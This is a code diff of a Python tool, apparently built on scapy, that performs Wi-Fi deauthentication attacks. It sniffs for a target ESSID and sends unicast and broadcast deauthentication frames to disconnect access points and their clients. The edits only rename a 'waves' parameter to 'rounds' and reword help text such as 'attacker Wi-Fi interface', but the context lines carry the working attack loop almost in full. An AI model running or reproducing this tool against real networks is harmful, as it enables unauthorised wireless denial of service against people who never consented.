@@ -113,13 +113,13 @@ def get_src_dst_network(frame):
         raise MsgException(e, 'Frame Control field could not be processed')
     return bssid_src, bssid_dst, bssid_network
 
-def unicast_deauth(wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_network):
+def unicast_deauth(wifi_interface, deauth_rounds, bssid_sta, bssid_ap, bssid_network):
     '''unicast deauthentication'''
     
     try:
         def unicast_deauth_parallel():
             sys.stderr = sys.stdout = None
-            for i in range(deauth_waves):
+            for i in range(deauth_rounds):
                 sendrecv.sendp(
                     dot11.RadioTap() /
                     dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
@@ -137,18 +137,18 @@ def unicast_deauth(wifi_interface, deauth_waves, bssid_sta, bssid_ap, bssid_netw
                     verbose = False,
                 )
         multiprocessing.Process(target = unicast_deauth_parallel).start()
-        print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
-        print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
+        print_info(f'sending {deauth_rounds} x {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
+        print_info(f'sending {deauth_rounds} x {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
     except Exception as e:
         raise MsgException(e, 'Unicast deauthentication frames could not be sent')
 
-def broadcast_deauth(wifi_interface, deauth_waves, bssid_ap, bssid_network):
+def broadcast_deauth(wifi_interface, deauth_rounds, bssid_ap, bssid_network):
     '''broadcast deauthentication'''
     
     try:
         def broadcast_deauth_parallel():
             sys.stderr = sys.stdout = None
-            for i in range(deauth_waves):
+            for i in range(deauth_rounds):
                 sendrecv.sendp(
                     dot11.RadioTap() /
                     dot11.Dot11(addr1 = BROADCAST, addr2 = bssid_ap, addr3 = bssid_network) /
@@ -158,11 +158,11 @@ def broadcast_deauth(wifi_interface, deauth_waves, bssid_ap, bssid_network):
                     verbose = False,
                 )
         multiprocessing.Process(target = broadcast_deauth_parallel).start()
-        print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} broadcast deauthentication frames from AP {bssid_ap} ...')
+        print_info(f'sending {deauth_rounds} x {DEAUTH_COUNT} broadcast deauthentication frames from AP {bssid_ap} ...')
     except Exception as e:
         raise MsgException(e, 'Broadcast deauthentication frames could not be sent')
 
-def sniffer_wrapper(wifi_interface, essid, broadcast_enabled, deauth_waves, aps_whitelist, access_points, stations):
+def sniffer_wrapper(wifi_interface, essid, broadcast_enabled, deauth_rounds, aps_whitelist, access_points, stations):
     def sniffer_handler(frame):
         '''sniffed frame processing'''
         
@@ -179,7 +179,7 @@ def sniffer_wrapper(wifi_interface, essid, broadcast_enabled, deauth_waves, aps_
                                 if dot11_element.info and (dot11_element.info == bytes(essid, 'utf-8')):
                                     access_points.add(bssid_src, essid)
                                     if broadcast_enabled:
-                                        broadcast_deauth(wifi_interface, deauth_waves, bssid_src, bssid_network)
+                                        broadcast_deauth(wifi_interface, deauth_rounds, bssid_src, bssid_network)
                                 break
                             dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                 
@@ -192,7 +192,7 @@ def sniffer_wrapper(wifi_interface, essid, broadcast_enabled, deauth_waves, aps_
                                 if dot11_element.info and (dot11_element.info == bytes(essid, 'utf-8')):
                                     access_points.add(bssid_dst, essid)
                                     if broadcast_enabled:
-                                        broadcast_deauth(wifi_interface, deauth_waves, bssid_dst, bssid_network)
+                                        broadcast_deauth(wifi_interface, deauth_rounds, bssid_dst, bssid_network)
                                 break
                             dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                 
@@ -200,10 +200,10 @@ def sniffer_wrapper(wifi_interface, essid, broadcast_enabled, deauth_waves, aps_
                 else:
                     if (bssid_src in access_points) and (stations.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
                         stations.update(bssid_dst, bssid_src, essid)
-                        unicast_deauth(wifi_interface, deauth_waves, bssid_dst, bssid_src, bssid_network)
+                        unicast_deauth(wifi_interface, deauth_rounds, bssid_dst, bssid_src, bssid_network)
                     elif (bssid_dst in access_points) and (stations.get(bssid_src) != bssid_dst):
                         stations.update(bssid_src, bssid_dst, essid)
-                        unicast_deauth(wifi_interface, deauth_waves, bssid_src, bssid_dst, bssid_network)
+                        unicast_deauth(wifi_interface, deauth_rounds, bssid_src, bssid_dst, bssid_network)
         
         except Exception as e:
             raise MsgException(e, 'Sniffed frames could not be processed')
@@ -226,26 +226,26 @@ def main():
         parser.add_argument(
             '-i',
             dest = 'wifi_interface',
-            help = 'Wi-Fi interface',
+            help = 'attacker Wi-Fi interface',
             required = True,
         )
         parser.add_argument(
             '-e',
             dest = 'essid',
-            help = 'target Wi-Fi ESSID',
+            help = 'target ESSID',
             required = True,
         )
         parser.add_argument(
             '-b',
             dest = 'broadcast_enabled',
-            help = 'broadcast deauthentication flag',
+            help = 'enable broadcast deauthentication',
             required = False,
             action = 'store_true',
         )
         parser.add_argument(
             '-n',
-            dest = 'deauth_waves',
-            help = 'number of deauthentication waves',
+            dest = 'deauth_rounds',
+            help = 'number of deauthentication rounds',
             required = False,
             type = int,
             default = 1,
@@ -253,7 +253,7 @@ def main():
         parser.add_argument(
             '-wl',
             dest = 'aps_whitelist',
-            help = 'comma-separated BSSIDs whitelist',
+            help = 'comma-separated APs whitelist',
             required = False,
             type = AccessPointsWhitelist,
             default = [],
@@ -275,7 +275,7 @@ def main():
                 args.wifi_interface,
                 args.essid,
                 args.broadcast_enabled,
-                args.deauth_waves,
+                args.deauth_rounds,
                 args.aps_whitelist,
                 access_points,
                 stations,
